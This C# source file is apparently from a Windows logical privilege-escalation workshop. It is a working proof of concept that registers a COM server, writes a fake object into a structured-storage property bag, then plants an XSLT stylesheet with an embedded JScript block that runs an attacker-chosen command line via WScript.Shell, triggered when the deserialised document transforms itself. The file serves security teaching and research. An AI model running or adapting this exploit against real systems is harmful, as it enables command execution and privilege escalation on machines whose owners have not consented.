//    This file is part of windows-logical-eop-workshop
//    Copyright (C) James Forshaw 2017
//
//    windows-logical-eop-workshop is free software: you can redistribute
//    it and/or modify it under the terms of the GNU General Public License 
//    as published by the Free Software Foundation, either version 3 of the 
//    License, or (at your option) any later version.
//
//    windows-logical-eop-workshop is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with windows-logical-eop-workshop.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Text;

namespace COMServer
{
    class Program
    {
        static RegistrationServices _reg_services = new RegistrationServices();
        static int _cookie;

        const int DACL_SECURITY_INFORMATION = 0x00000004;

        [DllImport("Advapi32.dll", SetLastError = true)]
        static extern bool SetKernelObjectSecurity(
              IntPtr Handle,
              int SecurityInformation,
              byte[] SecurityDescriptor
            );

        static void RunComServer()
        {
            Console.WriteLine("Starting Service");
            try
            {
                _cookie = _reg_services.RegisterTypeForComClients(
                    typeof(COMService),
                    RegistrationClassContext.LocalServer,
                    RegistrationConnectionType.MultipleUse);

                // Remove SD to simulate a more privileged process.
                RawSecurityDescriptor sd = new RawSecurityDescriptor("D:");
                byte[] sd_bytes = new byte[sd.BinaryLength];
                sd.GetBinaryForm(sd_bytes, 0);
                if (!SetKernelObjectSecurity(new IntPtr(-1), DACL_SECURITY_INFORMATION, sd_bytes))
                {
                    throw new Win32Exception();
                }

                Console.WriteLine("Registered COM Class {0}", typeof(COMService).GUID);
                Console.ReadLine();
                _reg_services.UnregisterTypeForComClients(_cookie);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: {0}", ex.Message);
            }
        }

        [MTAThread]
        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                RunComServer();   
            }
            else
            {
                dynamic obj = null;

                try
                {
                    obj = Activator.CreateInstance(Type.GetTypeFromCLSID(typeof(COMService).GUID));
                }
                catch (Exception)
                {
                    Console.WriteLine("Couldn't create object, running as server instead");
                    RunComServer();
                    return;
                }
                
                try
                {
                    IStorage stg = obj.GetStorage();
                    Console.WriteLine("Specify command line to start");
                    string cmdline = Console.ReadLine().Trim();

                    IStorage new_stg = stg.CreateStorage("TestStorage", 2 | 0x1000 | 0x10, 0, 0);
                    Console.WriteLine("new_stg: {0}", new_stg);
                    IPropertyBag bag = (IPropertyBag)new_stg;
                    Console.WriteLine("Bag: {0}", bag);
                    PROPVARIANT var = new PROPVARIANT(new FakeObject());
                    bag.Write("X", var);
                    Console.WriteLine("Completed Write");
                    new_stg.Commit(0);
                    Marshal.ReleaseComObject(bag);
                    Marshal.ReleaseComObject(new_stg);

                    new_stg = stg.OpenStorage("TestStorage", IntPtr.Zero, 0x12, IntPtr.Zero, 0);
                    bag = (IPropertyBag)new_stg;
                    var = new PROPVARIANT(0);
                    Console.WriteLine("Reading back steam");
                    bag.Read("X", var, IntPtr.Zero);
                    System.Runtime.InteropServices.ComTypes.IStream stm = (System.Runtime.InteropServices.ComTypes.IStream)var.ToObject();
                    stm.Seek(16, 0, IntPtr.Zero);
                    byte[] arr = Encoding.ASCII.GetBytes("<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' xmlns:msxsl='urn:schemas-microsoft-com:xslt' xmlns:user='http://mycompany.com/mynamespace'> <msxsl:script language='JScript' implements-prefix='user'> function xml(nodelist) { var o = new ActiveXObject('WScript.Shell'); o.Exec('%CMDLINE%'); return nodelist.nextNode().xml; } </msxsl:script> <xsl:template match='/'> <xsl:value-of select='user:xml(.)'/> </xsl:template> </xsl:stylesheet>".Replace("%CMDLINE%", cmdline));
                    stm.Write(arr, arr.Length, IntPtr.Zero);
                    Console.WriteLine("Done Write");
                    Marshal.ReleaseComObject(stm);
                    Marshal.ReleaseComObject(bag);
                    Marshal.ReleaseComObject(new_stg);

                    new_stg = stg.OpenStorage("TestStorage", IntPtr.Zero, 0x12, IntPtr.Zero, 0);
                    bag = (IPropertyBag)new_stg;
                    var = new PROPVARIANT();
                    Console.WriteLine("Reading back steam");
                    bag.Read("X", var, IntPtr.Zero);
                    dynamic doc = var.ToObject();
                    Console.WriteLine("Done Read {0}", doc);
                    doc.setProperty("AllowXsltScript", true);
                    doc.transformNode(doc);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: {0}", ex.Message);
                }
            }
        }
    }
}
